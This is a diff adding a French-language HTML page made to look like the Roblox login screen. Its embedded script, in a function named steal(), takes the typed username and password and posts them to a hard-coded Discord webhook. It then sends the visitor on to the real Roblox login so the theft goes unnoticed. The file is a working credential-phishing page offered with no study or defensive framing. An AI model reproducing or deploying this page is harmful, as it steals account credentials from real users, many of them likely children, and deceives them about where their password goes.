@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox - Connexion</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #222; padding: 30px; border-radius: 8px; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        input { width: 100%; box-sizing: border-box; padding: 10px; margin: 10px 0; background: #333; border: 1px solid #444; color: white; border-radius: 4px; }
+        button { width: 100%; padding: 10px; background: #00b06f; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Connexion Roblox</h2>
+        <input type="text" id="username" placeholder="Nom d'utilisateur">
+        <input type="password" id="password" placeholder="Mot de passe">
+        <button onclick="steal()">Se connecter</button>
+    </div>
+    <script>
+        const WEBHOOK = 'https://discordapp.com/api/webhooks/1547994032393682965/YdsNShcvttaWIj40P6F30WpRzjY072upHnow17OYwi_8tPIIGy5qBt9MCu2f4mAVevRc';
+
+        async function steal() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            if(!u || !p) return;
+
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `Tentative - User: \`${u}\` | Pass: \`${p}\`` })
+            }).then(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            });
+        }
+    </script>
+</body>
+</html>
